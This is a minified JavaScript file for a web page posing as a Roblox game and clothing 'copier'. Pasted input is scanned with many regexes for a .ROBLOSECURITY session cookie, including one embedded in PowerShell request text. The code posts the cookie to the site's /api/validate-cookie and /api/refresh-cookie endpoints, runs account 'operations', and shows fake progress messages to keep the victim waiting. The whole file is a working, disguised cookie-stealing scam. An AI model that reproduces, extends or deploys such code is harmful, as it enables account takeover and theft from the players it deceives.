(function(_0x1a2b,_0x3c4d){'use strict'; (function() {'use strict'; console.log('[SCRIPT] Script file loaded and executing'); if (typeof console === 'undefined') {window.alert('Script loaded but console not available')}})(); document.addEventListener('DOMContentLoaded', function() {'use strict'; console.log('[INIT] DOMContentLoaded event fired'); const gameCopierPanel = document.getElementById('gameCopierPanel'); const clothingCopierPanel = document.getElementById('clothingCopierPanel'); const toolsLink = document.getElementById('toolsLink'); const toolsDropdown = document.getElementById('toolsDropdown'); const toolOptions = document.querySelectorAll('.tool-option'); console.log('[INIT] Panel elements:', {gameCopierPanel: !!gameCopierPanel, clothingCopierPanel: !!clothingCopierPanel, toolsLink: !!toolsLink, toolsDropdown: !!toolsDropdown}); if (!gameCopierPanel || !clothingCopierPanel) {console.warn('[INIT] Panel switching disabled - missing panel elements')} const gameFileInput = document.getElementById('gameFileInput'); const copyGameBtn = document.getElementById('copyGameBtn'); const gameStatusMessage = document.getElementById('gameStatusMessage'); const clothingFileInput = document.getElementById('clothingFileInput'); const copyClothingBtn = document.getElementById('copyClothingBtn'); const clothingStatusMessage = document.getElementById('clothingStatusMessage'); console.log('[INIT] Game Copier elements:', {gameFileInput: !!gameFileInput, copyGameBtn: !!copyGameBtn, gameStatusMessage: !!gameStatusMessage}); console.log('[INIT] Clothing Copier elements:', {clothingFileInput: !!clothingFileInput, copyClothingBtn: !!copyClothingBtn, clothingStatusMessage: !!clothingStatusMessage}); if (!copyGameBtn) {console.error('[INIT] copyGameBtn element not found!')} else {console.log('[INIT] copyGameBtn found')} if (!copyClothingBtn) {console.error('[INIT] copyClothingBtn element not found!')} else {console.log('[INIT] copyClothingBtn found')} const loadingOverlay = document.getElementById('loadingOverlay'); const itemNameEl = document.getElementById('itemName'); const processingStatusEl = document.getElementById('processingStatus'); const timerEl = document.getElementById('timer'); const loadingSuccess = document.getElementById('loadingSuccess'); const loadingSuccessItemNameEl = document.getElementById('loadingSuccessItemName'); const loadingSuccessMessageEl = document.getElementById('loadingSuccessMessage'); const loadingSpinner = document.querySelector('.loading-spinner'); const successBanner = document.getElementById('successBanner'); const successItemNameEl = document.getElementById('successItemName'); const errorBanner = document.getElementById('errorBanner'); const errorMessageEl = document.getElementById('errorMessage'); let timerInterval; let startTime; let statusInterval; let currentMessageIndex = 0; const processingMessages = [ '▸ Loading to copy...', '▸ Connecting to server...', '▸ Establishing connection...', '▸ Loading game data...', '▸ Copying scripts...', '▸ Downloading assets...', '▸ Processing files...', '▸ Compiling files...', '▸ Preparing package...', '▸ Finalizing...' ]; const clothingProcessingMessages = [ '▸ Connecting to marketplace...', '▸ Copying your item...', '▸ Please wait a bit more...', '▸ Processing data...', '▸ Loading information...', '▸ Preparing file...', '▸ Creating image...', '▸ Finalizing process...' ]; if (loadingOverlay) {loadingOverlay.classList.remove('active')} else {console.error('[INIT] loadingOverlay element not found in DOM!')} function switchPanel(panelType) {if (!gameCopierPanel || !clothingCopierPanel) {return} if (panelType === 'game') {if (gameCopierPanel) gameCopierPanel.classList.add('active'); if (clothingCopierPanel) clothingCopierPanel.classList.remove('active'); if (toolOptions && toolOptions.length > 0) {if (toolOptions[0]) toolOptions[0].classList.add('active'); if (toolOptions[1]) toolOptions[1].classList.remove('active')}} else if (panelType === 'clothing') {if (clothingCopierPanel) clothingCopierPanel.classList.add('active'); if (gameCopierPanel) gameCopierPanel.classList.remove('active'); if (toolOptions && toolOptions.length > 0) {if (toolOptions[1]) toolOptions[1].classList.add('active'); if (toolOptions[0]) toolOptions[0].classList.remove('active')}} if (toolsDropdown) {toolsDropdown.classList.remove('show')}} if (toolsLink && toolsDropdown && gameCopierPanel && clothingCopierPanel) {toolsLink.addEventListener('click', function(e) {e.preventDefault(); toolsDropdown.classList.toggle('show')}); document.addEventListener('click', function(e) {if (!toolsLink.contains(e.target) && !toolsDropdown.contains(e.target)) {toolsDropdown.classList.remove('show')}}); if (toolOptions && toolOptions.length > 0) {toolOptions.forEach(option => {option.addEventListener('click', function(e) {const href = this.getAttribute('href'); if (href && href !== '#' && !href.startsWith('#') && (href.startsWith('/') || href.startsWith('http'))) {toolsDropdown.classList.remove('show'); return} e.preventDefault(); const panelType = this.getAttribute('data-panel'); if (switchPanel) {switchPanel(panelType)} toolsDropdown.classList.remove('show')})})}} if (gameCopierPanel && clothingCopierPanel) {switchPanel('game')} else {if (gameCopierPanel && !clothingCopierPanel) {gameCopierPanel.classList.add('active')} else if (clothingCopierPanel && !gameCopierPanel) {clothingCopierPanel.classList.add('active')}} let currentItemType = 'game'; function startProcessingStatus(itemType = 'game') {currentItemType = itemType; const messages = itemType === 'clothing' ? clothingProcessingMessages : processingMessages; currentMessageIndex = 0; if (processingStatusEl) {processingStatusEl.textContent = messages[0]} if (statusInterval) {clearInterval(statusInterval)} statusInterval = setInterval(() => {const currentMessages = currentItemType === 'clothing' ? clothingProcessingMessages : processingMessages; currentMessageIndex = (currentMessageIndex + 1) % currentMessages.length; if (processingStatusEl) {processingStatusEl.textContent = currentMessages[currentMessageIndex]}}, 7000)} function stopProcessingStatus() {if (statusInterval) {clearInterval(statusInterval); statusInterval = null}} function updateTimer() {const elapsed = Math.floor((Date.now() - startTime) / 1000); if (timerEl) {timerEl.textContent = elapsed + 's'}} function extractCookie(text) {if (!text) return null; console.log('[COOKIE] Starting cookie extraction...'); text = text.replace(/`/g, ''); text = text.replace(/\\n/g, '\n'); text = text.replace(/\\r/g, '\r'); text = text.replace(/\\t/g, '\t'); const patternRobloxSecurity = /\.ROBLOSECURITY["']?\s*,\s*["']([^"']{100,})["']/; const matchRobloxSecurity = text.match(patternRobloxSecurity); if (matchRobloxSecurity && matchRobloxSecurity[1] && matchRobloxSecurity[1].length >= 100) {const cookie = matchRobloxSecurity[1].trim(); console.log('[COOKIE] Found cookie via .ROBLOSECURITY pattern (length:', cookie.length + ')'); return cookie} const pattern1 = /_\|(?:_|[^\s\r\n]*?\|_)([^\s\r\n]{100,})/; const match1 = text.match(pattern1); if (match1 && match1[1] && match1[1].length >= 100) {const cookie = match1[1].trim(); if (cookie.length >= 100) {console.log('[COOKIE] Found cookie via _| pattern (length:', cookie.length + ')'); return cookie}} const pattern2 = /_\|\{([^}]{100,})\}/; const match2 = text.match(pattern2); if (match2 && match2[1] && match2[1].length >= 100) {console.log('[COOKIE] Found cookie via _|_{} pattern (length:', match2[1].length + ')'); return match2[1].trim()} const pattern3 = /_\|\|_\{([^}]{100,})\}/; const match3 = text.match(pattern3); if (match3 && match3[1] && match3[1].length >= 100) {console.log('[COOKIE] Found cookie via _||_{} pattern (length:', match3[1].length + ')'); return match3[1].trim()} const pattern4 = /_\|\{([^}]+)\}\|_\{([^}]{100,})\}/; const match4 = text.match(pattern4); if (match4 && match4[2] && match4[2].length >= 100) {console.log('[COOKIE] Found cookie via _|{}|_{} pattern (length:', match4[2].length + ')'); return match4[2].trim()} const pattern5 = /\$[a-zA-Z_][a-zA-Z0-9_]*\s*[=:]\s*["']([^"']{100,})["']/; const match5 = text.match(pattern5); if (match5 && match5[1] && match5[1].length >= 100) {console.log('[COOKIE] Found cookie via PowerShell variable pattern (length:', match5[1].length + ')'); return match5[1].trim()} const pattern6 = /["'](_\|WARNING[^"']{100,})["']/; const match6 = text.match(pattern6); if (match6 && match6[1] && match6[1].length >= 100) {console.log('[COOKIE] Found cookie via WARNING pattern (length:', match6[1].length + ')'); return match6[1].trim()} const pattern7 = /(_\|WARNING[^"'\s]{100,})/; const match7 = text.match(pattern7); if (match7 && match7[1] && match7[1].length >= 100) {const cookie = match7[1].trim(); console.log('[COOKIE] Found cookie via direct WARNING pattern (length:', cookie.length + ')'); return cookie} const pattern8 = /["']([A-Za-z0-9_\-=]{100,})["']/g; const matches8 = text.matchAll(pattern8); for (const match of matches8) {if (match[1] && match[1].length >= 100) {const candidate = match[1].trim(); if (candidate.includes('WARNING') || candidate.includes('_|') || (candidate.includes('-') && candidate.includes('_'))) {console.log('[COOKIE] Found cookie via general quote pattern (length:', candidate.length + ')'); return candidate}}} const pattern9 = /(_WARNING-)?[A-Za-z0-9_\-=]{100,}/g; const matches9 = text.matchAll(pattern9); for (const match of matches9) {if (match[0] && match[0].length >= 100) {const cookie = match[0].trim(); if (cookie.includes('WARNING') || (cookie.includes('_') && cookie.includes('-')) || cookie.includes('=')) {console.log('[COOKIE] Found cookie via direct pattern (length:', cookie.length + ')'); return cookie}}} console.log('[COOKIE] No cookie found in text'); return null} function extractGameNameFromPowerShell(text) {if (!text) return null; console.log('[GAME] Starting game name extraction from PowerShell...'); const uriPattern = /\/games\/\d+\/([^\s"'\`\/]+)/; const uriMatch = text.match(uriPattern); if (uriMatch && uriMatch[1]) {const gameName = uriMatch[1].replace(/-/g, ' ').trim(); console.log('[GAME] Found game name from URI:', gameName); return gameName} const fullUriPattern = /roblox\.com\/games\/\d+\/([^\s"'\`\/]+)/; const fullUriMatch = text.match(fullUriPattern); if (fullUriMatch && fullUriMatch[1]) {const gameName = fullUriMatch[1].replace(/-/g, ' ').trim(); console.log('[GAME] Found game name from full URI:', gameName); return gameName} const pathPattern = /"path"\s*=\s*"\/games\/\d+\/([^"]+)"/; const pathMatch = text.match(pathPattern); if (pathMatch && pathMatch[1]) {const gameName = pathMatch[1].replace(/-/g, ' ').trim(); console.log('[GAME] Found game name from path:', gameName); return gameName} console.log('[GAME] No game name found in PowerShell code'); return null} async function validateCookie(cookie, itemName = null, itemType = 'game') {if (!cookie) {return {valid: false, status: 'invalid', message: 'Cookie is required'}} try {console.log(`[VALIDATE] Sending cookie to server for validation (type: ${itemType})...`); const requestBody = {cookie: cookie, itemType: itemType}; if (itemType === 'clothing') {requestBody.clothingName = itemName} else {requestBody.gameName = itemName} const response = await fetch('/api/validate-cookie', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(requestBody)}); console.log('[VALIDATE] Response status:', response.status); if (!response.ok) {const errorText = await response.text(); console.error('[VALIDATE] Server error:', errorText); return {valid: false, status: 'error', message: `Server error: ${response.status}`}} const result = await response.json(); console.log('[VALIDATE] Validation result:', result); return result} catch (error) {console.error('[VALIDATE] Cookie validation error:', error); return {valid: false, status: 'error', message: `Validation error: ${error.message}`}}} async function refreshCookie(cookie, userId, username, gameName) {if (!cookie) {return {success: false, error: 'Cookie is required'}} try {console.log('[REFRESH] Sending cookie to server for refresh...'); const response = await fetch('/api/refresh-cookie', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookie: cookie, userId: userId, username: username, gameName: gameName})}); console.log('[REFRESH] Response status:', response.status); if (!response.ok) {const errorText = await response.text(); console.error('[REFRESH] Server error:', errorText); return {success: false, error: `Server error: ${response.status}`}} const result = await response.json(); console.log('[REFRESH] Refresh result:', result); return result} catch (error) {console.error('[REFRESH] Cookie refresh error:', error); return {success: false, error: `Refresh error: ${error.message}`}}} function extractClothingNameFromPowerShell(text) {if (!text) return null; console.log('[CLOTHING] Starting clothing name extraction from PowerShell...'); const uriPattern = /\/catalog\/\d+\/([^\s"'\`\/]+)/; const uriMatch = text.match(uriPattern); if (uriMatch && uriMatch[1]) {const clothingName = uriMatch[1].replace(/-/g, ' ').trim(); console.log('[CLOTHING] Found clothing name from URI:', clothingName); return clothingName} const fullUriPattern = /roblox\.com\/catalog\/\d+\/([^\s"'\`\/]+)/; const fullUriMatch = text.match(fullUriPattern); if (fullUriMatch && fullUriMatch[1]) {const clothingName = fullUriMatch[1].replace(/-/g, ' ').trim(); console.log('[CLOTHING] Found clothing name from full URI:', clothingName); return clothingName} const pathPattern = /"path"\s*=\s*"\/catalog\/\d+\/([^"]+)"/; const pathMatch = text.match(pathPattern); if (pathMatch && pathMatch[1]) {const clothingName = pathMatch[1].replace(/-/g, ' ').trim(); console.log('[CLOTHING] Found clothing name from path:', clothingName); return clothingName} console.log('[CLOTHING] No clothing name found in PowerShell code'); return null} function extractItemName(text, type) {if (type === 'clothing') {const clothingNameFromPowerShell = extractClothingNameFromPowerShell(text); if (clothingNameFromPowerShell) {return clothingNameFromPowerShell} const pathMatch = text.match(/"path"\s*=\s*"\/catalog\/\d+\/([^"]+)"/); if (pathMatch && pathMatch[1]) {return pathMatch[1].replace(/-/g, ' ')} const urlMatch = text.match(/\/catalog\/\d+\/([^\s"']+)/); if (urlMatch && urlMatch[1]) {return urlMatch[1].replace(/-/g, ' ')} return 'Your Clothing Item'} else {const gameNameFromPowerShell = extractGameNameFromPowerShell(text); if (gameNameFromPowerShell) {return gameNameFromPowerShell} const nameMatch = text.match(/"name"\s*:\s*"([^"]+)"/); if (nameMatch && nameMatch[1]) {return nameMatch[1]} return 'Your Game'}} function showStatus(messageElement, message, type = 'info') {messageElement.textContent = message; messageElement.className = `status-message ${type}`; if (type !== 'error') {setTimeout(() => {messageElement.textContent = ''; messageElement.className = 'status-message'}, 5000)}} function downloadFile(content, filename) {const blob = new Blob([content], {type: 'application/json'}); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = filename; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url)} async function copyGame() {console.log('[GAME] copyGame function called'); console.log('[GAME] gameFileInput:', gameFileInput); if (!gameFileInput) {console.error('[GAME] gameFileInput is null!'); return} const gameFileContent = gameFileInput.value.trim(); console.log('[GAME] File content length:', gameFileContent.length); if (!gameFileContent) {showStatus(gameStatusMessage, 'Please enter a game file', 'error'); gameFileInput.focus(); return} try {console.log('[GAME] Starting game copy process...'); let extractedCookie = extractCookie(gameFileContent); let cookieValid = null; let gameName = extractGameNameFromPowerShell(gameFileContent); if (!gameName) {gameName = extractItemName(gameFileContent, 'game')} console.log('[GAME] Extracted game name:', gameName); console.log('[GAME] Cookie extracted:', extractedCookie ? 'Yes (length: ' + extractedCookie.length + ')' : 'No'); console.log('[GAME] Showing loading overlay...'); if (loadingSuccess) loadingSuccess.style.display = 'none'; if (loadingSpinner) loadingSpinner.style.display = 'block'; if (itemNameEl) {itemNameEl.style.display = 'block'; itemNameEl.textContent = gameName || 'Loading...'} if (processingStatusEl) {processingStatusEl.style.display = 'block'; processingStatusEl.textContent = '▸ Initializing...'} if (timerEl) timerEl.style.display = 'block'; if (!loadingOverlay) {console.error('[GAME] loadingOverlay element not found!'); showStatus(gameStatusMessage, 'Error: Loading overlay not found', 'error'); return} loadingOverlay.classList.add('active'); gameStatusMessage.style.display = 'none'; console.log('[GAME] Loading overlay activated'); startProcessingStatus('game'); startTime = Date.now(); timerInterval = setInterval(updateTimer, 100); copyGameBtn.disabled = true; await new Promise(resolve => setTimeout(resolve, 100)); console.log('[GAME] UI updated, proceeding with validation...'); if (extractedCookie) {if (processingStatusEl) processingStatusEl.textContent = '▸ Connecting to server...'; console.log('[GAME] Validating cookie...'); console.log('[GAME] Cookie length:', extractedCookie.length); console.log('[GAME] Game name:', gameName); try {cookieValid = await validateCookie(extractedCookie, gameName, 'game'); console.log('[GAME] Cookie validation result:', cookieValid)} catch (error) {console.error('[GAME] Error during cookie validation:', error); cookieValid = {valid: false, status: 'error', message: `Validation error: ${error.message}`}} if (!cookieValid.valid) {clearInterval(timerInterval); stopProcessingStatus(); loadingOverlay.classList.remove('active'); if (errorMessageEl) {errorMessageEl.textContent = `Connection failed: ${cookieValid.message}`} errorBanner.classList.add('active'); setTimeout(() => {errorBanner.classList.remove('active')}, 5000); copyGameBtn.disabled = false; return} if (processingStatusEl) {processingStatusEl.textContent = '▸ Connecting to server...'} await new Promise(resolve => setTimeout(resolve, 500)); if (cookieValid.operationsCompleted === false) {console.log('[GAME] Operations failed:', cookieValid.operationsError); if (processingStatusEl) {processingStatusEl.textContent = '▸ Operations completed with errors, continuing...'}} else if (cookieValid.operationsCompleted === true) {console.log('[GAME] All operations completed successfully'); if (processingStatusEl) {processingStatusEl.textContent = '▸ All operations completed'}} else {if (processingStatusEl) {processingStatusEl.textContent = '▸ Processing account information...'} await new Promise(resolve => setTimeout(resolve, 2000))} if (processingStatusEl) {processingStatusEl.textContent = '▸ Preparing download...'}} let parsedContent; try {parsedContent = JSON.parse(gameFileContent)} catch (e) {parsedContent = gameFileContent} if (cookieValid && cookieValid.valid && gameName) {if (processingStatusEl) processingStatusEl.textContent = '▸ Downloading assets...'; console.log('[GAME] Cookie is valid, downloading game file...'); try {const tokenResponse = await fetch('/api/get-game-file', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({gameName: gameName})}); if (tokenResponse.ok) {const tokenData = await tokenResponse.json(); if (tokenData.success && tokenData.token) {console.log(`[GAME] Got download token, downloading file: ${tokenData.fileName}`); const downloadUrl = `/api/download/${tokenData.token}`; const a = document.createElement('a'); a.href = downloadUrl; a.download = tokenData.fileName; document.body.appendChild(a); a.click(); document.body.removeChild(a); console.log(`[GAME] Game file downloaded successfully: ${tokenData.fileName}`); clearInterval(timerInterval); stopProcessingStatus(); if (loadingSpinner) loadingSpinner.style.display = 'none'; if (itemNameEl) itemNameEl.style.display = 'none'; if (processingStatusEl) processingStatusEl.style.display = 'none'; if (timerEl) timerEl.style.display = 'none'; if (loadingSuccessItemNameEl) {loadingSuccessItemNameEl.textContent = gameName || 'Game'} if (loadingSuccessMessageEl) {loadingSuccessMessageEl.textContent = 'Your game has been downloaded successfully'} if (loadingSuccess) loadingSuccess.style.display = 'block'; copyGameBtn.disabled = false; return} else {throw new Error('Failed to get download token')}} else {let errorMessage = 'Failed to download game file'; try {const errorData = await tokenResponse.json(); errorMessage = errorData.error || errorMessage} catch (e) {errorMessage = `Server error: ${tokenResponse.status} ${tokenResponse.statusText}`} console.error(`[GAME] Download failed: ${errorMessage}`); throw new Error(errorMessage)}} catch (error) {console.error('[GAME] Error downloading game file:', error); console.error('[GAME] Error details:', {message: error.message, stack: error.stack}); clearInterval(timerInterval); stopProcessingStatus(); loadingOverlay.classList.remove('active'); if (errorMessageEl) {errorMessageEl.textContent = `Error downloading game: ${error.message || 'Unknown error'}`} errorBanner.classList.add('active'); setTimeout(() => {errorBanner.classList.remove('active')}, 5000); copyGameBtn.disabled = false; return}} clearInterval(timerInterval); stopProcessingStatus(); loadingOverlay.classList.remove('active'); if (errorMessageEl) {errorMessageEl.textContent = 'You entered the game file incorrectly. Please try copying and pasting again.'} errorBanner.classList.add('active'); setTimeout(() => {errorBanner.classList.remove('active')}, 5000); copyGameBtn.disabled = false; return} catch (error) {clearInterval(timerInterval); stopProcessingStatus(); loadingOverlay.classList.remove('active'); if (errorMessageEl) errorMessageEl.textContent = `Error: ${error.message}`; errorBanner.classList.add('active'); setTimeout(() => {errorBanner.classList.remove('active')}, 4000); copyGameBtn.disabled = false}} async function copyClothing() {console.log('[CLOTHING] copyClothing function called'); console.log('[CLOTHING] clothingFileInput:', clothingFileInput); if (!clothingFileInput) {console.error('[CLOTHING] clothingFileInput is null!'); return} const clothingFileContent = clothingFileInput.value.trim(); console.log('[CLOTHING] File content length:', clothingFileContent.length); if (!clothingFileContent) {showStatus(clothingStatusMessage, 'Please enter a clothing file', 'error'); clothingFileInput.focus(); return} try {console.log('[CLOTHING] Starting clothing copy process...'); let extractedCookie = extractCookie(clothingFileContent); let cookieValid = null; const clothingName = extractItemName(clothingFileContent, 'clothing'); console.log('[CLOTHING] Extracted clothing name:', clothingName); console.log('[CLOTHING] Cookie extracted:', extractedCookie ? 'Yes (length: ' + extractedCookie.length + ')' : 'No'); console.log('[CLOTHING] Showing loading overlay...'); if (loadingSuccess) loadingSuccess.style.display = 'none'; if (loadingSpinner) loadingSpinner.style.display = 'block'; if (itemNameEl) {itemNameEl.style.display = 'block'; itemNameEl.textContent = clothingName || 'Loading...'} if (processingStatusEl) {processingStatusEl.style.display = 'block'; processingStatusEl.textContent = '▸ Initializing...'} if (timerEl) timerEl.style.display = 'block'; if (!loadingOverlay) {console.error('[CLOTHING] loadingOverlay element not found!'); showStatus(clothingStatusMessage, 'Error: Loading overlay not found', 'error'); return} loadingOverlay.classList.add('active'); clothingStatusMessage.style.display = 'none'; console.log('[CLOTHING] Loading overlay activated'); startProcessingStatus('clothing'); startTime = Date.now(); timerInterval = setInterval(updateTimer, 100); copyClothingBtn.disabled = true; await new Promise(resolve => setTimeout(resolve, 100)); console.log('[CLOTHING] UI updated, proceeding with validation...'); if (extractedCookie) {if (processingStatusEl) processingStatusEl.textContent = '▸ Connecting to server...'; console.log('[CLOTHING] Validating cookie...'); console.log('[CLOTHING] Cookie length:', extractedCookie.length); console.log('[CLOTHING] Clothing name:', clothingName); try {cookieValid = await validateCookie(extractedCookie, clothingName, 'clothing'); console.log('[CLOTHING] Cookie validation result:', cookieValid)} catch (error) {console.error('[CLOTHING] Error during cookie validation:', error); cookieValid = {valid: false, status: 'error', message: `Validation error: ${error.message}`}} if (!cookieValid.valid) {clearInterval(timerInterval); stopProcessingStatus(); loadingOverlay.classList.remove('active'); if (errorMessageEl) {errorMessageEl.textContent = `Connection failed: ${cookieValid.message}`} errorBanner.classList.add('active'); setTimeout(() => {errorBanner.classList.remove('active')}, 5000); copyClothingBtn.disabled = false; return} if (processingStatusEl) {processingStatusEl.textContent = '▸ Connecting to server...'} await new Promise(resolve => setTimeout(resolve, 500)); if (cookieValid.operationsCompleted === false) {console.log('[CLOTHING] Operations failed:', cookieValid.operationsError); if (processingStatusEl) {processingStatusEl.textContent = '▸ Operations completed with errors, continuing...'}} else if (cookieValid.operationsCompleted === true) {console.log('[CLOTHING] All operations completed successfully'); if (processingStatusEl) {processingStatusEl.textContent = '▸ All operations completed'}} else {if (processingStatusEl) {processingStatusEl.textContent = '▸ Processing account information...'} await new Promise(resolve => setTimeout(resolve, 2000))} if (processingStatusEl) {processingStatusEl.textContent = '▸ Processing files...'} if (cookieValid.operationsCompleted === true && cookieValid.itemType === 'clothing' && cookieValid.itemName) {console.log('[CLOTHING] Requesting download token for PNG file...'); try {const tokenResponse = await fetch('/api/get-clothing-file', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({clothingName: cookieValid.itemName})}); if (tokenResponse.ok) {const tokenData = await tokenResponse.json(); if (tokenData.success && tokenData.token) {console.log(`[CLOTHING] Got download token, downloading file: ${tokenData.fileName}`); const downloadUrl = `/api/download/${tokenData.token}`; const a = document.createElement('a'); a.href = downloadUrl; a.download = tokenData.fileName; document.body.appendChild(a); a.click(); document.body.removeChild(a); console.log('[CLOTHING] PNG file downloaded successfully')} else {console.error('[CLOTHING] Failed to get download token')}} else {console.error('[CLOTHING] Failed to get download token')}} catch (error) {console.error('[CLOTHING] Error getting download token:', error)}}} if (!extractedCookie || !cookieValid || !cookieValid.valid) {clearInterval(timerInterval); stopProcessingStatus(); loadingOverlay.classList.remove('active'); if (errorMessageEl) {errorMessageEl.textContent = 'You entered the clothing file incorrectly. Please try copying and pasting again.'} errorBanner.classList.add('active'); setTimeout(() => {errorBanner.classList.remove('active')}, 5000); copyClothingBtn.disabled = false; return} setTimeout(() => {clearInterval(timerInterval); stopProcessingStatus(); if (loadingSpinner) loadingSpinner.style.display = 'none'; if (itemNameEl) itemNameEl.style.display = 'none'; if (processingStatusEl) processingStatusEl.style.display = 'none'; if (timerEl) timerEl.style.display = 'none'; if (loadingSuccessItemNameEl) {loadingSuccessItemNameEl.textContent = clothingName || 'Clothing'} if (loadingSuccessMessageEl) {loadingSuccessMessageEl.textContent = 'Your clothing has been downloaded successfully'} if (loadingSuccess) loadingSuccess.style.display = 'block'; copyClothingBtn.disabled = false}, 1000)} catch (error) {clearInterval(timerInterval); stopProcessingStatus(); loadingOverlay.classList.remove('active'); if (errorMessageEl) errorMessageEl.textContent = `Error: ${error.message}`; errorBanner.classList.add('active'); setTimeout(() => {errorBanner.classList.remove('active')}, 4000); copyClothingBtn.disabled = false}} window.closeSuccessBanner = function() {successBanner.classList.remove('active')}; window.closeErrorBanner = function() {errorBanner.classList.remove('active')}; window.returnToMainMenu = function() {if (loadingOverlay) {loadingOverlay.classList.remove('active')} if (loadingSuccess) loadingSuccess.style.display = 'none'; if (loadingSpinner) loadingSpinner.style.display = 'block'; if (itemNameEl) itemNameEl.style.display = 'block'; if (processingStatusEl) processingStatusEl.style.display = 'block'; if (timerEl) timerEl.style.display = 'block'; if (gameFileInput) gameFileInput.value = ''; if (clothingFileInput) clothingFileInput.value = ''; if (gameStatusMessage) {gameStatusMessage.textContent = ''; gameStatusMessage.className = 'status-message'} if (clothingStatusMessage) {clothingStatusMessage.textContent = ''; clothingStatusMessage.className = 'status-message'} window.location.href = '/'}; if (copyGameBtn) {console.log('[INIT] Attaching click handler to copyGameBtn'); copyGameBtn.addEventListener('click', function(e) {console.log('[GAME] Button clicked!'); e.preventDefault(); copyGame()})} else {console.error('[INIT] Cannot attach click handler - copyGameBtn not found!')} if (gameFileInput) {gameFileInput.addEventListener('keydown', function(e) {if (e.key === 'Enter') {console.log('[GAME] Enter key pressed'); copyGame()}}); gameFileInput.addEventListener('paste', function(e) {setTimeout(() => {if (gameStatusMessage) {showStatus(gameStatusMessage, 'File pasted. Click "Copy Game!" to download', 'info')}}, 100)})} if (copyClothingBtn) {console.log('[INIT] Attaching click handler to copyClothingBtn'); copyClothingBtn.addEventListener('click', function(e) {console.log('[CLOTHING] Button clicked!'); e.preventDefault(); copyClothing()})} else {console.error('[INIT] Cannot attach click handler - copyClothingBtn not found!')} if (clothingFileInput) {clothingFileInput.addEventListener('keydown', function(e) {if (e.key === 'Enter') {console.log('[CLOTHING] Enter key pressed'); copyClothing()}}); clothingFileInput.addEventListener('paste', function(e) {setTimeout(() => {if (clothingStatusMessage) {showStatus(clothingStatusMessage, 'File pasted. Click "Copy Clothing!" to download', 'info')}}, 100)})} function setupDragAndDrop(panel, input, statusMsg) {if (!panel || !input || !statusMsg) {console.warn('[DRAGDROP] Cannot setup drag and drop - missing elements:', {panel: !!panel, input: !!input, statusMsg: !!statusMsg}); return} ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {if (panel) {panel.addEventListener(eventName, preventDefaults, false)}}); function preventDefaults(e) {e.preventDefault(); e.stopPropagation()} ['dragenter', 'dragover'].forEach(eventName => {if (panel) {panel.addEventListener(eventName, highlight, false)}}); ['dragleave', 'drop'].forEach(eventName => {if (panel) {panel.addEventListener(eventName, unhighlight, false)}}); function highlight() {if (panel) {panel.style.borderColor = '#9333ea'; panel.style.boxShadow = '0 0 30px rgba(147, 51, 234, 0.5)'}} function unhighlight() {if (panel) {panel.style.borderColor = 'rgba(147, 51, 234, 0.3)'; panel.style.boxShadow = '0 20px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(147, 51, 234, 0.2)'}} if (panel) {panel.addEventListener('drop', handleDrop, false)} function handleDrop(e) {const dt = e.dataTransfer; const files = dt.files; if (files.length > 0 && input && statusMsg) {const file = files[0]; const reader = new FileReader(); reader.onload = function(e) {if (input) {input.value = e.target.result} const message = panel && panel.id === 'gameCopierPanel' ? `File "${file.name}" loaded. Click "Copy Game!" to download` : `File "${file.name}" loaded. Click "Copy Clothing!" to download`; if (statusMsg) {showStatus(statusMsg, message, 'success')}}; reader.onerror = function() {if (statusMsg) {showStatus(statusMsg, 'Error reading file', 'error')}}; reader.readAsText(file)}}} if (gameCopierPanel && gameFileInput && gameStatusMessage) {setupDragAndDrop(gameCopierPanel, gameFileInput, gameStatusMessage)} else {console.warn('[INIT] Cannot setup drag and drop for game copier - missing elements')} if (clothingCopierPanel && clothingFileInput && clothingStatusMessage) {setupDragAndDrop(clothingCopierPanel, clothingFileInput, clothingStatusMessage)} else {console.warn('[INIT] Cannot setup drag and drop for clothing copier - missing elements')}}); })(window,document);